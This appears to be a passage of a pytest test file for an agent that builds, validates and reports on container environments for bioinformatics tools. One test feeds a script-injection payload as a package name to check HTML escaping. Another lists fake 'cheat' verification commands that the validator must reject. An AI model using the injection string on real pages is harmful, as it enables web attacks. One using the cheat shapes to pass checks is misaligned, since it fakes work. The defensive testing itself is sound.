                "evidence": "command -v rasusa", "purpose": "rasusa", "engine_coupled": True})
    # baked form is wrapped in `pixi run bash -c '...'` (shell so builtins/pipes work)
    assert cb.longtail[-1]["command"].startswith("pixi run bash -c ")
    assert "cargo install rasusa --root /usr/local --locked" in cb.longtail[-1]["command"]
    # self-contained → bare
    cb.install({"command": "install -m0755 /tmp/x /usr/local/bin/x", "evidence": "command -v x",
                "purpose": "x"})
    assert cb.longtail[-1]["command"] == "install -m0755 /tmp/x /usr/local/bin/x"


def test_envbuild_orchestrator_plan_and_content_digest():
    """The core orchestrator records conda specs + long-tail tools + how to verify
    each in the image, and content-addresses by what was GOT (lock + commands +
    platform + engine). Pure parts — no container."""
    from agent.skills.env_build import EnvBuild
    from agent.skills import install_commands as ic
    eb = EnvBuild("demo", "1.0", platform="linux/amd64")
    eb.add_conda(["samtools=1.21"], verify=[("samtools", "samtools --version")])
    eb.add_tool(ic.release_binary("seqkit", "https://x/seqkit_linux_amd64.tar.gz", binary_in_archive="seqkit"))
    eb.add_tool(ic.cargo("rasusa", "rasusa", version="4.1.0"))
    # routing: conda verify is engine-coupled; binary is bare; cargo is coupled
    by = {v["label"]: v for v in eb.verifications}
    assert by["samtools"]["engine_coupled"] is True
    assert by["seqkit (release binary)"]["engine_coupled"] is False
    assert any(v["engine_coupled"] for v in eb.verifications if "cargo" in v["label"])
    assert eb.conda_specs == ["samtools=1.21"] and len(eb.tools) == 2
    # content digest: stable, and sensitive to the recipe (lock + commands)
    eb.lock_text = "pixi.lock-bytes"
    eb.cb.longtail = [{"command": "RUN x"}]
    d1 = eb.content_digest()
    assert d1.startswith("sha256:") and d1 == eb.content_digest()
    eb.cb.longtail = [{"command": "RUN y"}]
    assert eb.content_digest() != d1
    # ...and sensitive to the BASE IMAGE digest (the OS foundation is in the anchor).
    eb.cb.longtail = [{"command": "RUN x"}]
    d_base = eb.content_digest()
    eb.cb.base = "debian:bookworm-slim@sha256:" + "00" * 32
    assert eb.content_digest() != d_base


def test_container_native_engine_optional_for_longtail_only():
    """A pure binary/source/half-baked env carries NO engine (no pixi/micromamba) —
    bootstrap lines appear only when conda/pip specs were declared."""
    from agent.skills.container_build import emit_dockerfile, PixiEngine
    steps = [{"command": "set -eux; git clone x && make && install -m755 t /usr/local/bin/", "purpose": "t"}]
    df = emit_dockerfile("debian:bookworm-slim", engine=PixiEngine(), has_env_layer=False, longtail_steps=steps)
    assert "pixi" not in df and "micromamba" not in df          # no engine at all
    assert "RUN set -eux; git clone x && make" in df            # long-tail baked verbatim
    assert "build-essential" in df                              # apt toolchain present for source


def test_non_conda_installs_includes_perl():
    """perl installs must surface in non_conda_installs so freeze replays (not adopts)."""
    from agent.skills.freeze import non_conda_installs
    draft = {"install_steps": [{"installed_packages": [{"name": "Bio::DB::HTS",
        "install_method": {"type": "perl", "module": "Bio::DB::HTS",
                           "distribution": "Bio::DB::HTS", "cpanm_flags": "--notest"}}]}]}
    nc = {x["name"]: x["type"] for x in non_conda_installs(draft)}
    assert nc == {"Bio::DB::HTS": "perl"}


def _selfverify_workflow(with_test_data: bool) -> dict:
    # A REAL file: I8's test-data clause stats what the spec declares, so a workflow
    # carrying `/abs/reads.fastq.gz` is one whose declared input isn't there.
    from real_inputs import real_input
    reads = real_input("reads.fastq.gz")
    step = {"step": 1, "returncode": 0,
            "command": f"seqkit stats -o /abs/out/stats.tsv {reads}",
            "inputs": [{"path": reads}],
            "detected_outputs": ["/abs/out/stats.tsv"],
            "validation": {"stats.tsv": {"passed": True, "validation_method": "tsv_parse"}},
            "resource_usage": {"wall_seconds": 1.0, "peak_rss_mb": 10.0, "max_cpu_percent": 50.0}}
    spec = {"pipeline_name": "wf", "pipeline_steps": [step]}
    if with_test_data:
        spec["test_data"] = {"r1": reads}
    return spec


def test_workflow_spec_self_verifies_only_with_its_sources():
    """A sealed WorkflowSpec must carry the external input sources I8 needs, or it
    can't be re-verified standalone. Without test_data the step input is an
    orphan (I8 fires); carrying test_data makes it self-verifying."""
    from agent.skills.spec_writer import check_workflow_invariants
    bad = check_workflow_invariants(_selfverify_workflow(with_test_data=False))
    assert any(v["invariant"].startswith("I8") for v in bad), f"expected I8 orphan; got {bad}"
    good = check_workflow_invariants(_selfverify_workflow(with_test_data=True))
    assert not good, f"workflow carrying its test_data must self-verify; got {good}"


def test_key_packages_version_fallback_for_binary_tier():
    """A release-binary tool has no plain `version`; the guide must recover it
    from the release tag in binary_url (not render 'seqkit=?')."""
    from agent.skills.user_guide import key_packages
    kp = key_packages(_draft_with_binary())
    assert kp.get("seqkit") == "2.13.0"
    assert kp.get("python") == "3.11"


# ---------------------------------------------------------------------------
# Validation-locus pivot — in-container resource capture (I7), validated==shipped,
# lock-engine seam.
# ---------------------------------------------------------------------------

def test_gnu_time_and_stat_parsers():
    """The in-container resource capture must parse GNU `time -v` (exact peak via
    getrusage) and `docker stats` (sampled fallback) into I7-shaped numbers."""
    from agent.skills.docker_builder import DockerBuilder as DB
    rusage = (
        "\tCommand being timed: \"seqkit\"\n"
        "\tPercent of CPU this job got: 129%\n"
        "\tElapsed (wall clock) time (h:mm:ss or m:ss): 0:01.08\n"
        "\tMaximum resident set size (kbytes): 80384\n"
    )
    got = DB._parse_gnu_time(rusage)
    assert got["peak_rss_mb"] == 78.5 and got["max_cpu_percent"] == 129.0
    assert got["wall_seconds"] == 1.08
    assert DB._parse_gnu_time("no rusage line here") is None
    # docker-stats MemUsage / CPUPerc fallback
    assert abs(DB._parse_mem_mb("1.5GiB") - 1536.0) < 0.1
    assert DB._parse_mem_mb("512MiB") == 512.0
    assert DB._parse_pct("124.00%") == 124.0


def test_validated_in_shipped_image_requires_digest_match():
    """validated==shipped holds ONLY when every validated step ran in the env
    image AND its recorded image digest matches the frozen env's digest."""
    from agent.skills.user_guide import validated_in_shipped_image
    fr = {"image_digest": "sha256:abc"}
    step = lambda dig, ran=True: {"step": 1, "returncode": 0,
                                  "validation": {"o": {"passed": True}},
                                  "ran_in_container": ran, "container_image_digest": dig}
    assert validated_in_shipped_image({"pipeline_steps": [step("sha256:abc")]}, fr) is True
    # wrong digest (validated a different image than we ship) → False
    assert validated_in_shipped_image({"pipeline_steps": [step("sha256:zzz")]}, fr) is False
    # ran on the host, not in the image → False
    assert validated_in_shipped_image({"pipeline_steps": [step("sha256:abc", ran=False)]}, fr) is False
    # no freeze digest → can't claim it
    assert validated_in_shipped_image({"pipeline_steps": [step("sha256:abc")]}, {}) is False
    # no validated steps → False
    assert validated_in_shipped_image({"pipeline_steps": []}, fr) is False


def test_validated_in_shipped_image_multi_env_chaining():
    """A multi-env workflow chains steps that ran in DIFFERENT frozen envs; it's
    still validated==shipped iff every validated step's digest is in the set of all
    frozen env digests."""
    from agent.skills.user_guide import validated_in_shipped_image
    step = lambda dig: {"step": 1, "returncode": 0, "validation": {"o": {"passed": True}},
                        "ran_in_container": True, "container_image_digest": dig}
    spec = {"pipeline_steps": [step("sha256:envA"), step("sha256:envB")]}
    # both envs are frozen → validated==shipped across the chain
    assert validated_in_shipped_image(spec, valid_digests={"sha256:envA", "sha256:envB"}) is True
    # one step ran in an env that isn't a known frozen env → not shippable
    assert validated_in_shipped_image(spec, valid_digests={"sha256:envA"}) is False
    # single-env default still works (one digest)
    assert validated_in_shipped_image({"pipeline_steps": [step("sha256:envA")]},
                                      {"image_digest": "sha256:envA"}) is True


def test_lock_engine_prefers_pixi(monkeypatch):
    """The lock-engine seam keeps us the universal adapter: pixi when present,
    else conda-lock, else none — callers never bind to one engine."""
    import shutil
    from agent.skills.env_manager import EnvManager
    present = {"pixi", "conda-lock"}
    monkeypatch.setattr(shutil, "which", lambda n: f"/usr/bin/{n}" if n in present else None)
    assert EnvManager.lock_engine() == "pixi"
    present.discard("pixi")
    assert EnvManager.lock_engine() == "conda-lock"
    present.clear()
    assert EnvManager.lock_engine() == "none"


# ---------------------------------------------------------------------------
# env_honesty — the container-native Layer-1 contract (REPLACES the host moat's
# env-build invariants: I1/I2/I5/I9/I10/I11/I12/I13/I14 → BUILT · VALIDATED_IN_IMAGE
# · POLICY_CLEAN). Pure: check_build over a hand-built BuildResult, no container.
# ---------------------------------------------------------------------------

def _clean_build_result(**over):
    """A BuildResult that satisfies the contract; override fields to break it."""
    r = {
        "image": "demo:1.0", "image_digest": "sha256:abc",
        "verifications": [
            {"label": "samtools", "tool": "samtools", "check": "samtools --version", "passed": True},
            {"label": "seqkit (release binary)", "tool": "seqkit",
             "check": "command -v seqkit", "passed": True},
        ],
        "accelerator": None, "license_gated": False, "licenses": [], "redistributable": True,
    }
    r.update(over)
    return r


def test_env_honesty_accepts_a_clean_build():
    from agent.skills.env_honesty import check_build
    assert check_build(_clean_build_result()) == []


def test_env_honesty_BUILT_requires_image_and_digest():
    """BUILT absorbs I1/I9/I11/I14: the image existing IS the anchor (a failed RUN,
    each carrying its own inline sha256/commit/bake anchor, fails docker build)."""
    from agent.skills.env_honesty import check_build
    inv = {v["invariant"] for v in check_build(_clean_build_result(image=""))}
    assert "BUILT.image_present" in inv
    inv = {v["invariant"] for v in check_build(_clean_build_result(image_digest=""))}
    assert "BUILT.image_digest_resolved" in inv


def test_env_honesty_VALIDATED_catches_failed_in_image_evidence():
    """validated==shipped: a tool whose evidence didn't pass in the SHIPPED image
    is not provably present in what we ship (the strong form of I2)."""
    from agent.skills.env_honesty import check_build
    r = _clean_build_result()
    r["verifications"][1]["passed"] = False
    r["verifications"][1]["rc"] = 127
    inv = {v["invariant"] for v in check_build(r)}
    assert "VALIDATED_IN_IMAGE.evidence_passed" in inv


def test_env_honesty_VALIDATED_rejects_echo_cheat_shapes():
    """The carried I2 anti-echo-cheat shape rule: a constant-true / bare-echo /
    no-tool-token evidence is rejected even if it 'passes' (rc=0) in the image —
    it never exercised the tool."""
    from agent.skills.env_honesty import check_build
    for cheat in ("true", ":", "exit 0", 'echo "samtools 1.21"', "[ 1 = 1 ]"):
        r = _clean_build_result()
        r["verifications"][0]["check"] = cheat   # but still passed=True (the cheat works)
        inv = {v["invariant"] for v in check_build(r)}
        assert "VALIDATED_IN_IMAGE.evidence_shape" in inv, f"missed cheat: {cheat!r}"


def test_env_honesty_VALIDATED_requires_some_evidence():
    from agent.skills.env_honesty import check_build
    inv = {v["invariant"] for v in check_build(_clean_build_result(verifications=[]))}
    assert "VALIDATED_IN_IMAGE.no_evidence" in inv


def test_env_honesty_evidence_shape_word_boundary_and_perl_and_probes():
    """The shape rule mirrors I2's word-boundary token (cat ≠ concatenate), accepts
    the perl -M idiom (module glued to a capital letter) and conda-prefix-stripped
    forms (r-ape→ape), and accepts a tool-less authored-file probe (test -f)."""
    from agent.skills.env_honesty import evidence_shape_violation as sv
    # real probes pass
    assert sv("samtools --version", "samtools") is None
    assert sv("command -v seqkit", "seqkit") is None
    assert sv("perl -MBio::DB::HTS -e1", "Bio::DB::HTS") is None
    assert sv("Rscript -e 'library(ape)'", "r-ape") is None          # prefix-stripped
    assert sv("test -f /opt/x/config.yaml") is None                   # no tool token, real probe
    # cheats fail
    assert sv("true", "samtools")
    assert sv('echo "cat 1.0"', "cat")
    assert sv("concatenate --help", "cat")                            # word-boundary: cat ⊄ concatenate
    assert sv("", "samtools")
    assert sv("uname -a")                                             # no token, no recognizable probe


def test_env_honesty_POLICY_carries_I12_accelerator():
    from agent.skills.env_honesty import check_build
    # mps must be dev_only
    inv = {v["invariant"] for v in check_build(_clean_build_result(accelerator={"type": "mps"}))}
    assert "I12.mps_dev_only" in inv
    # cuda needs a toolkit version
    inv = {v["invariant"] for v in check_build(_clean_build_result(accelerator={"type": "cuda"}))}
    assert "I12.accel_toolkit_version_required" in inv
    # honest cuda passes
    assert check_build(_clean_build_result(
        accelerator={"type": "cuda", "toolkit_version": "12.4", "runtime": "build_only"})) == []


def test_env_honesty_POLICY_carries_I13_license_firewall():
    from agent.skills.env_honesty import check_build
    inv = {v["invariant"] for v in check_build(
        _clean_build_result(license_gated=True, redistributable=True, licenses=[]))}
    assert "I13.gated_not_redistributable" in inv and "I13.gated_license_recorded" in inv
    # honest gated artifact passes
    assert check_build(_clean_build_result(
        license_gated=True, redistributable=False, licenses=["10x EULA"])) == []


def test_envbuild_run_uses_check_build_as_the_gate(monkeypatch):
    """EnvBuild.run() refuses (success=False) when the contract is violated, even
    if the raw in-image validation 'succeeded' — the contract is the sole gate."""
    from agent.skills.env_build import EnvBuild
    from agent.skills import install_commands as ic
    eb = EnvBuild("demo", "1.0")
    eb.add_tool(ic.release_binary("seqkit", "https://x/seqkit_linux_amd64.tar.gz",
                                  binary_in_archive="seqkit"))
    # stub the container-driving stages: build ok, freeze ok, digest ok, and an
    # in-image verify that "passes" but with a CHEAT shape on the recorded check.
    monkeypatch.setattr(eb, "build", lambda: {"success": True})
    monkeypatch.setattr(eb, "freeze", lambda: {"success": True, "image": "demo:1.0"})
    monkeypatch.setattr(eb.cb, "image_digest", lambda img: "sha256:abc")
    monkeypatch.setattr(eb.cb, "close", lambda: None)
    monkeypatch.setattr(eb, "verify_in_image", lambda img: {"success": True, "verifications": [
        {"label": "seqkit", "tool": "seqkit", "check": "true", "passed": True}]})
    res = eb.run()
    assert res["success"] is False
    assert any(v["invariant"] == "VALIDATED_IN_IMAGE.evidence_shape"
               for v in res["honesty_violations"])
    # and the happy path: honest evidence → accepted
    monkeypatch.setattr(eb, "verify_in_image", lambda img: {"success": True, "verifications": [
        {"label": "seqkit", "tool": "seqkit", "check": "command -v seqkit", "passed": True}]})
    assert eb.run()["success"] is True


# ---------------------------------------------------------------------------
# Build locus — native vs emulated, and the honesty stamp it produces.
# The VALIDATED_IN_IMAGE pass/fail is sound under emulation (faithful CPU
# emulators); only I7 timings need native silicon to be authoritative.
# ---------------------------------------------------------------------------

def test_locus_target_arch_parsing():
    """Both dialects, because the corpus contains both: freeze()'s `platform=` is a
    CONDA subdir and every BUILD record carries it, while container_build receives a
    DOCKER platform and every ADOPT record carries that.

    The unknown case returns "" and NOT the former "amd64 — sane default". That default
    was safe while the only consumer was detect_locus-vs-daemon, and became unsafe as
    soon as BUILT.platform compared this to an arch read off an image: a comparison that
    cannot tell "this is amd64" from "I cannot read this string" passes silently for
    every unparseable platform. It also stops an empty platform earning `locus: native`
    (and with it `i7_authoritative: True`) on an amd64 host purely by defaulting into
    agreement — unknown now lands on `emulated`, the conservative side.
    """
    from agent.skills import locus
    assert locus.target_arch("linux/amd64") == "amd64"
    assert locus.target_arch("linux/arm64") == "arm64"
    assert locus.target_arch("linux-64") == "amd64"
    assert locus.target_arch("linux-aarch64") == "arm64"
    assert locus.target_arch("") == ""


def test_locus_native_when_daemon_matches_target(monkeypatch):
    """daemon arch == target arch → native: I7 timings ARE authoritative, no advisory."""
    from agent.skills import locus
    monkeypatch.setattr(locus, "daemon_arch", lambda: "amd64")
    d = locus.detect_locus("linux/amd64")
    assert d["locus"] == "native"
    assert d["i7_authoritative"] is True
    assert d["emulator"] == "none"
    assert d["advisory"] == ""


def test_locus_emulated_when_daemon_differs(monkeypatch):
    """arm64 daemon building linux/amd64 → emulated: I7 NOT authoritative, advisory set."""
    from agent.skills import locus
    monkeypatch.setattr(locus, "daemon_arch", lambda: "arm64")
    d = locus.detect_locus("linux/amd64")  # probe_emulator defaults False → no container run
    assert d["locus"] == "emulated"
    assert d["i7_authoritative"] is False
    assert d["advisory"]  # actionable, non-empty
    assert "I7" in d["advisory"]


def test_daemon_is_remote_reads_docker_host(monkeypatch):
    from agent.skills import locus
    monkeypatch.setenv("DOCKER_HOST", "ssh://user@amd64-box")
    assert locus.daemon_is_remote() is True
    monkeypatch.setenv("DOCKER_HOST", "tcp://10.0.0.5:2375")
    assert locus.daemon_is_remote() is True
    monkeypatch.delenv("DOCKER_HOST", raising=False)
    assert locus.daemon_is_remote() is False


def test_detect_locus_native_via_remote_amd64_host(monkeypatch):
    """Point DOCKER_HOST at a native amd64 daemon → locus=native (daemon-agnostic
    build/validate), daemon_location=remote, I7 authoritative."""
    from agent.skills import locus
    monkeypatch.setattr(locus, "daemon_arch", lambda: "amd64")
    monkeypatch.setenv("DOCKER_HOST", "ssh://user@amd64-box")
    d = locus.detect_locus("linux/amd64")
    assert d["locus"] == "native" and d["i7_authoritative"] is True
    assert d["daemon_location"] == "remote"


def test_emulation_advisory_points_to_native_docker_host(monkeypatch):
    from agent.skills import locus
    monkeypatch.setattr(locus, "daemon_arch", lambda: "arm64")
    monkeypatch.delenv("DOCKER_HOST", raising=False)
    adv = locus.detect_locus("linux/amd64")["advisory"]
    assert "DOCKER_HOST" in adv and "INCONCLUSIVE" in adv


def test_locus_unknown_when_daemon_unqueryable(monkeypatch):
    """No daemon (docker absent) → unknown, never crashes, never claims authority."""
    from agent.skills import locus
    monkeypatch.setattr(locus, "daemon_arch", lambda: "")
    d = locus.detect_locus("linux/amd64")
    assert d["locus"] == "unknown"
    assert d["i7_authoritative"] is False


def test_locus_advisory_distinguishes_rosetta_and_qemu():
    from agent.skills import locus
    assert "Rosetta" in locus._emulation_advisory("rosetta")
    qemu = locus._emulation_advisory("qemu")
    # qemu wording only nudges toward Rosetta when on Apple Silicon; either way it
    # must flag the I7 caveat.
    assert "I7" in qemu


def test_envbuild_run_stamps_validation_locus(monkeypatch):
    """run() records WHERE it validated — native stamps i7_authoritative=True so the
    Layer-2 path can trust I7; the cache record carries the locus too."""
    from agent.skills.env_build import EnvBuild
    from agent.skills import install_commands as ic
    from agent.skills import locus
    monkeypatch.setattr(locus, "daemon_arch", lambda: "amd64")  # pretend native
    eb = EnvBuild("demo", "1.0")
    eb.add_tool(ic.release_binary("seqkit", "https://x/seqkit_linux_amd64.tar.gz",
                                  binary_in_archive="seqkit"))
    monkeypatch.setattr(eb, "build", lambda: {"success": True})
    monkeypatch.setattr(eb, "freeze", lambda: {"success": True, "image": "demo:1.0"})
    monkeypatch.setattr(eb.cb, "image_digest", lambda img: "sha256:abc")
    monkeypatch.setattr(eb.cb, "close", lambda: None)
    monkeypatch.setattr(eb, "verify_in_image", lambda img: {"success": True, "verifications": [
        {"label": "seqkit", "tool": "seqkit", "check": "command -v seqkit", "passed": True}]})
    res = eb.run()
    assert res["success"] is True
    assert res["validation_locus"] == "native"
    assert res["i7_authoritative"] is True


def test_stamp_i7_authority_tracks_locus(monkeypatch):
    """Captured I7 numbers are marked authoritative only on a native locus; under
    emulation they're stamped non-authoritative (emulator artefacts). Pass/fail of
    the step is unaffected — this is a truth label, not a gate."""
    from agent import mcp_server as m
    from agent.skills import locus
    monkeypatch.setattr(locus, "daemon_arch", lambda: "amd64")  # native
    ru = m._stamp_i7_authority({"peak_rss_kb": 123, "wall_s": 4.2}, "linux/amd64")
    assert ru["i7_authoritative"] is True and ru["locus"] == "native"
    monkeypatch.setattr(locus, "daemon_arch", lambda: "arm64")  # emulated amd64
    ru2 = m._stamp_i7_authority({"peak_rss_kb": 123}, "linux/amd64")
    assert ru2["i7_authoritative"] is False and ru2["locus"] == "emulated"
    assert m._stamp_i7_authority(None, "linux/amd64") is None  # no measurement → no crash


def test_base_image_is_pinned_by_digest():
    """The build/ship base must be pinned by DIGEST, not a moving tag — OS-layer
    reproducibility (the env layer is lock-pinned, binaries sha256-anchored). Both
    EnvBuild and ContainerBuild must honor the single pinned constant so a rebuild
    gets identical base bytes."""
    from agent.skills.container_build import BASE_IMAGE, ContainerBuild
    from agent.skills.env_build import EnvBuild
    assert "@sha256:" in BASE_IMAGE, "base must be digest-pinned, not a bare tag"
    assert ContainerBuild().base == BASE_IMAGE
    assert EnvBuild("x").cb.base == BASE_IMAGE
    # and it flows into the emitted Dockerfile's FROM (what actually ships)
    from agent.skills.container_build import emit_dockerfile, PixiEngine
    df = emit_dockerfile(BASE_IMAGE, engine=PixiEngine(), has_env_layer=False, longtail_steps=[])
    assert f"FROM {BASE_IMAGE}" in df


# ---------------------------------------------------------------------------
# Env report — rendered PURELY from the verified record (can't be faked).
# ---------------------------------------------------------------------------

def test_resolved_packages_parses_conda_meta_and_dist_info(monkeypatch):
    """The closure is read engine-agnostically from conda-meta/*.json (name-version-
    build) + site-packages/*.dist-info (name-version) — not a fragile engine table.

    A conda row carries its LICENCE after a tab, read out of the same conda-meta JSON the
    scan was already opening. The tab has to be split off BEFORE the name/version parse,
    which rsplits on "-": a licence like `GPL-3.0-or-later` folded into the build string
    would silently rewrite the package's version."""
    from agent.skills.container_build import ContainerBuild
    cb = ContainerBuild()
    cb.cid, cb.has_env_layer = "fake", True
    monkeypatch.setattr(cb, "exec", lambda *a, **k: {"returncode": 0, "stderr": "",
        "stdout": ("conda samtools-1.21-h50ea8bc_0\tMIT\n"
                   "conda libdeflate-1.19-hd590300_0\tGPL-3.0-or-later\n"
                   "conda novoalign-4.03.04-h1234_0\tCommercial (requires license for use)\n"
                   "conda mystery-2.0-h9_0\t\n"
                   "pypi pyfaidx-0.8.1.1\n")})
    pkgs = cb.resolved_packages()
    by = {p["name"]: p for p in pkgs}
    assert by["samtools"] == {"name": "samtools", "version": "1.21", "kind": "conda",
                              "license": "MIT"}
    # the hyphens in the licence do NOT reach the version parse
    assert by["libdeflate"] == {"name": "libdeflate", "version": "1.19", "kind": "conda",
                                "license": "GPL-3.0-or-later"}
    assert by["novoalign"]["license"] == "Commercial (requires license for use)"
    # `"license": null` in the metadata, and a dist-info (whose licence this scan does not
    # read at all) — both are "", which core_data reads as unrecognized, never as free.
    assert by["mystery"]["license"] == ""
    assert by["pyfaidx"] == {"name": "pyfaidx", "version": "0.8.1.1", "kind": "pypi",
                             "license": ""}


def _sample_record(locus="emulated"):
    return {
        "name": "demo", "image": "demo:1.0", "image_digest": "sha256:img",
        "content_digest": "sha256:cd", "platform": "linux/amd64", "mode": "build",
        "build_method": "container-native", "engine": "pixi", "gated": False,
        "redistributable": True, "validation_locus": locus, "created_at": "2026-05-24",
        "requested_tools": ["samtools"], "conda_specs": ["samtools=1.21"],
        "verifications": [{"tool": "samtools", "label": "samtools",
                           "check": "command -v samtools", "passed": True, "rc": 0}],
        "resolved_packages": [
            {"name": "samtools", "version": "1.21", "kind": "conda"},
            {"name": "htslib", "version": "1.21", "kind": "conda"},
            {"name": "libdeflate", "version": "1.19", "kind": "conda"}],
    }


def test_attestation_sbom_includes_apt_as_deb_purls():
    """A complete SBOM: the apt layer joins conda/pip in resolvedDependencies as
    deb purls — self-describing artifact for audit."""
    from agent.skills.attestation import build_attestation
    rec = dict(_sample_record("native"))
    rec["system_packages"] = [{"name": "libssl3", "version": "3.0.14-1", "kind": "apt"}]
    att = build_attestation(rec)
    uris = [d["uri"] for d in att["predicate"]["buildDefinition"]["resolvedDependencies"]]
    assert "pkg:conda/htslib@1.21" in uris        # tool closure
    assert "pkg:deb/debian/libssl3@3.0.14-1" in uris  # OS layer


def test_env_report_html_deterministic_and_contains_verified_facts():
    from agent.skills.env_report_html import render_env_report_html
    rec = _sample_record()
    h1 = render_env_report_html(rec)
    assert h1 == render_env_report_html(rec)                  # deterministic (no clock read)
    assert h1.startswith("<!DOCTYPE html>") and h1.rstrip().endswith("</html>")
    assert "sha256:cd" in h1 and "sha256:img" in h1          # content + image digests
    assert "samtools" in h1
    assert "VALIDATED_IN_IMAGE" in h1                         # build-mode honesty footer
    assert "command -v samtools" in h1                        # the actual in-image check shown
    assert "badge ok" in h1                                   # the ✓ validated badge


def test_env_report_html_escapes_injection():
    """No record value can inject markup — a hostile package name is escaped."""
    from agent.skills.env_report_html import render_env_report_html
    rec = dict(_sample_record())
    rec["resolved_packages"] = [{"name": "evil<script>alert(1)</script>", "version": "1", "kind": "conda"}]
    h = render_env_report_html(rec)
    assert "<script>alert(1)</script>" not in h
    assert "evil&lt;script&gt;" in h


def test_env_report_html_adopt_claims_validation_only_when_evidence_exists():
    """The ENV report must claim exactly what the record earned — no more, no less.

    Adopt now runs each tool's evidence inside the adopted image (audit 2026-07-16 Tier 2),
    so VALIDATED_IN_IMAGE is a claim it can earn. The report keys off the EVIDENCE, not the
    mode: a legacy adopt record (verifications absent — the shape samtools=1.21 registered
    with) must still say plainly that nothing was run in it. ADOPTED_BY_DIGEST survives in
    both cases: it is a provenance statement ("we did not build these bytes"), and that was
    never the part that was wrong.
    """
    from agent.skills.env_report_html import render_env_report_html
    base = {"name": "bt", "image": "x@sha256:d", "image_digest": "sha256:d",
            "mode": "adopt", "requested_tools": ["x"]}

    # legacy record: no evidence → must NOT claim validation, and must say so
    h = render_env_report_html({**base, "validation_locus": "adopted"})
    assert "ADOPTED_BY_DIGEST" in h
    assert "NOT VALIDATED IN-IMAGE" in h
    assert "nothing here proves it carries the requested tool" in h

    # validated adopt: evidence ran in the adopted image → the claim is earned
    h = render_env_report_html({**base, "validation_locus": "native",
                                "verifications": [{"label": "x", "tool": "x",
                                                   "check": "command -v x", "passed": True}]})
    assert "ADOPTED_BY_DIGEST" in h and "VALIDATED_IN_IMAGE" in h
    assert "the image we bound actually carries the tool" in h


def test_env_report_html_separates_declared_policy_from_verified():
    """gated/licenses/accelerator render in a DECLARED section explicitly labelled as
    submitter assertions, never as runtime-verified facts."""
    from agent.skills.env_report_html import render_env_report_html
    rec = dict(_sample_record())
    rec.update({"gated": True, "redistributable": False, "licenses": ["proprietary-EULA"],
                "accelerator": {"type": "cuda", "toolkit_version": "12.4"}})
    h = render_env_report_html(rec)
    assert "Declared policy" in h
    assert "caller assertion" in h.lower() or "submitter-declared" in h.lower()
    assert "proprietary-EULA" in h and "cuda" in h


def test_env_report_html_install_commands_is_own_top_level_section():
    """C3 (batch-3) — Install commands MUST be its own top-level section (its
    own `<section class="bx">` panel + `<h2>` heading), not a subsection nested
    under Along-for-the-Ride. The user's rule: 'all reports have the same set
    of sections' — and 'how things were installed' is structurally separate
    from 'what got pulled in' as a transitive dep."""
    from agent.skills.env_report_html import render_env_report_html
    rec = dict(_sample_record())
    from env_records import shipped_binary
    rec["shipped_binaries"] = [shipped_binary(
        "seqkit", provenance="seqkit (release binary)",
        install_command="curl -L -o /tmp/seqkit.tgz https://example.com/seqkit.tgz && tar xf /tmp/seqkit.tgz")]
    h = render_env_report_html(rec)
    # The install commands header is now an <h2>, NOT an <h3 class="sub">
    assert "<h2>Install commands" in h
    assert '<h3 class="sub">Install commands' not in h, (
        "Install commands must be a top-level section, not a sub-h3 inside "
        "Along-for-the-Ride")
    # The Along-for-the-Ride section no longer renders Install-commands inline
    along_idx = h.find("Along for the ride")
    install_idx = h.find("<h2>Install commands")
    assert along_idx != -1 and install_idx != -1
    assert install_idx > along_idx, (
        "Install commands section should follow Along-for-the-Ride")
    # The actual install command stays renderable
    assert "seqkit (release binary)" in h
    assert "curl -L -o" in h


def test_env_report_html_sections_constant_across_modes():
    """C3 / user rule — both adopt mode and build mode emit the SAME set of
    `<h2>` section headings (zero rows is fine; the operator wants to see
    that the section exists and is empty, not that the report 'looks different'
    between modes)."""
    from agent.skills.env_report_html import render_env_report_html
    import re

    def section_titles(html: str) -> list[str]:
        # plain text inside <h2>...</h2>, stripping nested <span class="note">
        # and <span class="pill">/etc. Take the title bytes that sit OUTSIDE
        # any nested span (which carry the count/notes/badges, not the title).
        out = []
        for m in re.finditer(r"<h2[^>]*>(.+?)</h2>", html, re.S):
            inner = m.group(1)
            # drop any nested <span ...>...</span> (notes / pills / badges)
            inner = re.sub(r"<span[^>]*>.*?</span>", "", inner, flags=re.S)
            # drop any remaining tags (id markers etc.)
            inner = re.sub(r"<[^>]+>", "", inner)
            out.append(inner.strip())
        return out

    build = render_env_report_html(_sample_record())
    # THE ADOPT FIXTURE NOW CARRIES EVIDENCE, and it always should have.
    #
    # It declared `requested_tools: ["samtools"]` and NO verifications, which is a
    # contract VIOLATION (`VALIDATED_IN_IMAGE.no_evidence` — "an env with nothing proven
    # in the shipped image is an unverified claim"). The page rendered it with exactly the
    # same sections as a clean build, which is the defect that made this fixture pass:
    # until 2026-08-07 the renderer never drew violations at all, so a record with no
    # in-image evidence whatsoever was visually indistinguishable from a validated one.
    #
    # This test's subject is whether the page's shape varies by MODE. It must not be fed a
    # record that also varies the CONTRACT STATE, or it silently tests two things and pins
    # the wrong one. `test_env_report_contract.py` owns the violations-section behaviour.
    adopt = render_env_report_html({
        "name": "bt", "image": "biocontainers/x@sha256:d",
        "image_digest": "sha256:d", "mode": "adopt", "validation_locus": "adopted",
        "requested_tools": ["samtools"],
        "verifications": [{"label": "samtools", "tool": "samtools",
                           "check": "samtools --version", "rc": 0, "passed": True,
                           "out": "samtools 1.21"}],
        "request_key": "samtools=1.21|linux/amd64|none",
    })
    build_titles = [t for t in section_titles(build) if t]
    adopt_titles = [t for t in section_titles(adopt) if t]
    assert build_titles == adopt_titles, (
        f"section titles differ between modes; build={build_titles!r}, "
        f"adopt={adopt_titles!r}")
    # Sanity: the six expected sections are present (in order). The trailing
    # 'How this was verified' is also a section.
    expected = ["Tools", "Along for the ride", "Install commands",
                "System packages (apt)", "Artifacts", "Declared policy",
                "How this was verified"]
    assert build_titles == expected, build_titles


def test_attestation_adopt_mode_does_not_claim_validated_in_image():
    """The SLSA attestation for an adopted image must assert ADOPTED_BY_DIGEST, not a
    VALIDATED_IN_IMAGE guarantee it never performed."""
    from agent.skills.attestation import build_attestation
    att = build_attestation({"image": "x@sha256:d", "image_digest": "sha256:d", "mode": "adopt"})
    guarantees = att["predicate"]["buildDefinition"]["internalParameters"]["honesty_contract"]
    assert "ADOPTED_BY_DIGEST" in guarantees and "VALIDATED_IN_IMAGE" not in guarantees
    # a build still claims the full contract
    bguar = build_attestation(_sample_record())["predicate"]["buildDefinition"][
        "internalParameters"]["honesty_contract"]
    assert "VALIDATED_IN_IMAGE" in bguar


# ---------------------------------------------------------------------------
# Registry push as default delivery — the push-target derivation + I13 firewall.
# ---------------------------------------------------------------------------

